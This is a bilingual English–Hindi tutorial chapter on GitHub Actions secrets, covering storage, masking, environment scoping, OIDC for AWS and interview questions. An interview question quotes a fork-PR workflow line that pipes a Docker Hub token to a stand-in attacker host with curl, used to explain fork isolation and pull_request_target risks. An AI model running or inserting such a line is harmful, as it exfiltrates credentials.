---

# 36. GitHub Secrets
# हिंदी में: GitHub Secrets (गुप्त जानकारी का सुरक्षित भंडार)

---

## 🔵 Simple Definition (English)
**GitHub Secrets** are encrypted values (passwords, API keys, SSH keys) stored at repository, environment or organization level. Workflows read them as `${{ secrets.NAME }}`. They are masked in logs and are not exposed to workflows triggered from forks.

## 🔵 सरल परिभाषा (Hindi)
**GitHub Secrets** encrypted values (passwords, API keys, SSH keys) हैं जो repository, environment या organization स्तर पर रखे जाते हैं। Workflows इन्हें `${{ secrets.NAME }}` से पढ़ते हैं। Logs में ये छिपे (masked) रहते हैं और fork से चलने वाले workflows को नहीं मिलते।

---

## 🔴 Problem it Solves
Putting credentials in code or in `.env` files committed to Git leaks them to everyone with access, to forks, and to history forever. CI/CD still needs the SSH key to your VPS, the Docker Hub token, the AWS keys. Secrets provide a place to store them encrypted and inject them only at run time.

## 🔴 यह क्यों बना? (Hindi)
Credentials को code में या commit हुई `.env` files में रखने से वे हर access वाले, forks और history में हमेशा के लिए leak हो जाते हैं। फिर भी CI/CD को VPS की SSH key, Docker Hub token, AWS keys चाहिए। Secrets इन्हें encrypted रखने और सिर्फ run time पर inject करने की जगह देते हैं।

---

## 🟢 How it Works — Step by Step

```
Step 1 → Add secret: Settings -> Secrets and variables -> Actions -> New repository secret (or `gh secret set`)
Step 2 → GitHub encrypts it client-side with the repo's public key (libsodium sealed box); stored encrypted
Step 3 → You CANNOT read it back from UI/API (only overwrite or delete)
Step 4 → Workflow references ${{ secrets.NAME }} (pass via env: or with:)
Step 5 → Runner receives decrypted value only for that job; log output is masked as ***
Step 6 → Secrets are NOT passed to workflows from forked PRs (except GITHUB_TOKEN read-only)
Step 7 → Scope levels: Repository, Environment (topic 35), Organization (choose repos)
Step 8 → Rotate regularly: set new value; old one is overwritten
```

## 🟢 कैसे काम करता है? (Hindi)
```
Step 1 → Secret जोड़ो: Settings -> Secrets and variables -> Actions -> New repository secret (या `gh secret set`)
Step 2 → GitHub इसे repo की public key से client-side encrypt करता है; encrypted ही stored रहता है
Step 3 → आप इसे UI/API से वापस पढ़ नहीं सकते (सिर्फ overwrite या delete)
Step 4 → Workflow में ${{ secrets.NAME }} लिखो (env: या with: से दो)
Step 5 → Runner को decrypted value सिर्फ उस job के लिए मिलती है; log में *** दिखता है
Step 6 → Fork के PR से चलने वाले workflows को secrets नहीं मिलते (सिर्फ read-only GITHUB_TOKEN)
Step 7 → Scope: Repository, Environment (topic 35), Organization
Step 8 → नियमित rotate करो: नई value set करो; पुरानी overwrite हो जाती है
```

---

## 🟡 Real World Example
A team deploys a Node.js API to an EC2 VPS. They store `VPS_HOST`, `VPS_USER`, and `VPS_SSH_KEY` (a dedicated deploy key, not a personal one) as secrets in the `production` environment, plus `DOCKERHUB_TOKEN`. A contractor's PR from a fork cannot read them. Once, a debug step `echo ${{ secrets.VPS_SSH_KEY }} | base64` leaked a base64 version in logs (masking works only on the exact string); the team rotated the key within minutes and removed the step.

## 🟡 Real Example Hindi mein
एक team Node.js API EC2 VPS पर deploy करती है। वे `VPS_HOST`, `VPS_USER` और `VPS_SSH_KEY` (अलग deploy key, personal नहीं) को `production` environment के secrets में रखते हैं, साथ में `DOCKERHUB_TOKEN`। Fork से आए contractor के PR को ये नहीं मिलते। एक बार debug step `echo ${{ secrets.VPS_SSH_KEY }} | base64` ने logs में base64 रूप leak कर दिया (masking सिर्फ ठीक वही string छुपाती है); team ने मिनटों में key rotate की और वह step हटाया।

---

## 💻 Code / Config Example — Basic

```bash
#!/usr/bin/env bash
# set-secrets.sh - add secrets with the GitHub CLI (values never touch Git)
set -euo pipefail                                    # strict mode
REPO="${1:?usage: $0 owner/repo}"                    # owner/repo

# Prompts for the value, input is hidden:
gh secret set DOCKERHUB_TOKEN --repo "$REPO"         # repository-level secret

# From a file (e.g. private key) so it never appears in shell history:
gh secret set VPS_SSH_KEY --repo "$REPO" < ~/.ssh/deploy_key   # reads the key file via stdin

# Environment-level secret (environment must already exist):
gh secret set VPS_HOST --repo "$REPO" --env production --body "203.0.113.10"   # example IP from doc range

gh secret list --repo "$REPO"                        # lists NAMES and update time only, never values
```

## 💻 Code / Config Example — Advanced

```yaml
# .github/workflows/deploy-secrets.yml - safe handling of secrets in a deploy job
name: Deploy with secrets                   # workflow name
on:
  push:
    branches: [main]                        # only from main
permissions:
  contents: read                            # minimal token permissions
jobs:
  deploy:                                   # job id
    runs-on: ubuntu-latest                  # hosted runner
    environment: production                 # environment-scoped secrets + approval
    steps:
      - uses: actions/checkout@v4           # code (example version)
      - name: Prepare SSH key               # label
        env:
          SSH_KEY: ${{ secrets.VPS_SSH_KEY }}   # secret goes via env var, not interpolated into the script text
          HOST: ${{ secrets.VPS_HOST }}         # host also via env
        run: |                              # shell script
          set -euo pipefail                 # strict mode
          install -m 700 -d ~/.ssh          # private .ssh directory
          printf '%s\n' "$SSH_KEY" > ~/.ssh/id_deploy   # write key from env
          chmod 600 ~/.ssh/id_deploy        # ssh refuses keys with open permissions
          ssh-keyscan -H "$HOST" >> ~/.ssh/known_hosts # trust host key (better: pin fingerprint in a variable)
      - name: Deploy                        # label
        env:
          HOST: ${{ secrets.VPS_HOST }}     # host from secret
          USER_NAME: ${{ secrets.VPS_USER }}   # user from secret
        run: |                              # shell script
          ssh -i ~/.ssh/id_deploy "$USER_NAME@$HOST" 'cd /srv/app && git pull && docker compose up -d --build'
      - name: Cleanup key                   # label
        if: always()                        # run even when deploy failed
        run: rm -f ~/.ssh/id_deploy         # remove key from runner disk
  derived-secret-mask:                      # job showing manual masking
    runs-on: ubuntu-latest                  # hosted runner
    steps:
      - name: Mask a derived value          # label
        env:
          RAW: ${{ secrets.DOCKERHUB_TOKEN }}   # original secret
        run: |                              # shell
          B64=$(printf '%s' "$RAW" | base64)    # derived value is NOT auto-masked
          echo "::add-mask::$B64"           # tell the runner to mask the derived string too
```
Workflow syntax checked with a YAML parser only; not run on GitHub.

---

## 🟠 My Stack Integration
Typical secrets for Node.js/FastAPI/React on VPS+AWS: `VPS_HOST`, `VPS_USER`, `VPS_SSH_KEY`, `DOCKERHUB_TOKEN` (or use GHCR with `GITHUB_TOKEN`), `DATABASE_URL`, `JWT_SECRET`. For AWS prefer **OIDC** (no stored keys):

```yaml
# .github/workflows/aws-oidc.yml - AWS access WITHOUT long-lived secrets
name: AWS OIDC                              # workflow name
on:
  workflow_dispatch:                        # manual trigger for demo
permissions:
  id-token: write                           # allow requesting an OIDC token
  contents: read                            # read repo
jobs:
  aws:                                      # job id
    runs-on: ubuntu-latest                  # hosted runner
    steps:
      - uses: aws-actions/configure-aws-credentials@v4   # official action, example version
        with:
          role-to-assume: arn:aws:iam::123456789012:role/gh-deploy   # example ARN (replace); role trusts this repo
          aws-region: ap-south-1            # example region
      - run: aws sts get-caller-identity    # prove we are authenticated as the role
```
Security checklist: least-privilege secrets (deploy user cannot sudo), rotate on staff change, never `echo` secrets, avoid `pull_request_target` with untrusted checkout, pin third-party actions to SHAs, use environment secrets for prod, and enable secret scanning push protection.

---

## ⚠️ Common Mistakes to Avoid
❌ Mistake 1: Interpolating secrets directly into `run:` scripts (`run: echo ${{ secrets.X }}`), enabling script injection and log exposure.
✅ Correct: Map to `env:` and use `"$VAR"` in the script.

❌ Mistake 2: Printing derived forms (base64, URL-encoded) of a secret.
✅ Correct: Do not print; if needed use `::add-mask::`.

❌ Mistake 3: Using one personal-account SSH key as `VPS_SSH_KEY`.
✅ Correct: Create a dedicated restricted deploy key per server and rotate it.

❌ Mistake 4: Storing multi-line JSON credentials and passing structured secrets that break masking (each line must be masked).
✅ Correct: Base64-encode once and decode at runtime, or use OIDC / a secrets manager.

---

## 🧠 Tricky Interview Question
A PR from a fork changes the workflow to `run: curl evil.com?d=${{ secrets.DOCKERHUB_TOKEN }}`. Does the attacker get the token?

Answer: Not with the normal `pull_request` trigger: secrets are not passed to workflows from forks, and workflow files from the PR head run in a restricted context (read-only token). The danger is with `pull_request_target` (runs in base repo context WITH secrets) if it checks out and executes PR code. Also, a collaborator with write access can push a branch with a modified workflow and read secrets, which is why environments with required reviewers and branch restrictions matter.

---

## ⚫ Interview Questions + Answers

Q1: Can you read a secret's value after saving?
A1: No. You can only update or delete it; workflows can use it at run time.

Q2: Secret vs variable?
A2: Secrets are encrypted and masked, for sensitive data. Variables (`vars.`) are plain text for non-sensitive config such as URLs and regions.

Q3: What is the size limit and count?
A3: Each secret up to 48 KB; limits on count per repo/org exist (check the docs, they can change). Use encryption plus a file for larger content.

Q4: Why not use `.env` committed to the repo?
A4: Anyone with read access and all history sees it; it cannot be revoked from history; it breaks least privilege.

Q5: Why OIDC instead of AWS keys in secrets?
A5: OIDC issues short-lived credentials per job based on trust conditions (repo/branch/environment), so there is nothing long-lived to leak or rotate.

---

## 🔷 When to Use + When Not to Use
✅ Use when:
- CI/CD needs credentials: SSH keys, registry tokens, API keys
- Scoped per environment with approvals

❌ Avoid when:
- Value is not sensitive (use variables)
- Cloud supports OIDC (prefer it over static keys)
- Runtime app secrets on the server (use AWS Secrets Manager / SSM or server `.env` with strict permissions)

---

## 📊 Visual Diagram
```
 You: gh secret set X  --encrypt(public key)-->  [ GitHub secret store ]
                                                      |
 workflow job (approved, right branch/environment)    |
   env: X=${{ secrets.X }} <-- decrypt just-in-time --+
        |
        v
   runner uses it; logs show ***   (fork PRs: NOT delivered)
        |
        v
   job ends -> runner destroyed (hosted) -> value gone
```

---

## 📝 Key Terms (English + Hindi)
| Term | Meaning | Hindi |
|------|---------|-------|
| Secret | Encrypted sensitive value | गुप्त मान |
| Masking | Hiding value in logs as *** | logs में छुपाना |
| Environment secret | Secret scoped to environment | environment का secret |
| OIDC | Short-lived cloud credentials via token | अल्पकालिक credentials |
| Rotation | Replacing a secret periodically | secret बदलना |
| Script injection | Untrusted text run as shell code | script में ज़बरदस्ती code |

---

## ⚡ 3-Line Summary
English: Secrets store encrypted credentials, injected into workflows as `secrets.NAME` and masked in logs.
Pass them through `env:`, scope to environments, never print or hardcode.
Prefer OIDC for AWS and rotate immediately when exposed.
Hindi: Secrets encrypted credentials रखते हैं, workflow में `secrets.NAME` से मिलते हैं और logs में छिपे रहते हैं।
इन्हें `env:` से पास करो, environments में बाँधो, कभी print या hardcode मत करो।
AWS के लिए OIDC चुनो और leak होने पर तुरंत rotate करो।

---

## ➡️ Next Topic
**37. GitHub Variables**: the non-secret sibling for plain configuration like URLs, regions and feature flags.

---
